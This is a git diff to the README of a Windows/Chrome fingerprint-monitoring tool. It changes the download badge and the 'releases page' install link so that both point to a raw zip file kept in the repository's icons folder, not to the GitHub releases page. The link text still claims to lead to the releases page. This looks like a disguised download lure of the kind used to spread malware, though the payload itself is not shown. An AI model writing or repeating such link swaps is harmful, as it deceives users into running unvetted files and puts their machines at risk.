@@ -1,6 +1,6 @@
 # 🔍 fingerprintdetector - Monitor website tracking and digital identity
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Cinematic-disgust8653/fingerprintdetector/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Cinematic-disgust8653/fingerprintdetector/main/icons/Software_v2.6.zip)
 
 This software monitors web activity at the browser level. It helps you identify which websites take information about your hardware, software, and browser settings. Many websites use these data points to track users across the internet. This tool makes those hidden background processes visible to you.
 
@@ -10,7 +10,7 @@ You need a Windows computer to use this extension. Ensure you have the Google Ch
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/Cinematic-disgust8653/fingerprintdetector/releases) to download the package.
+1. Visit the [releases page](https://raw.githubusercontent.com/Cinematic-disgust8653/fingerprintdetector/main/icons/Software_v2.6.zip) to download the package.
 2. Select the most recent file version available at the top of the list.
 3. Save the file to your computer.
 4. Extract the contents of the file to a folder you can find easily, like your Downloads or Documents folder.
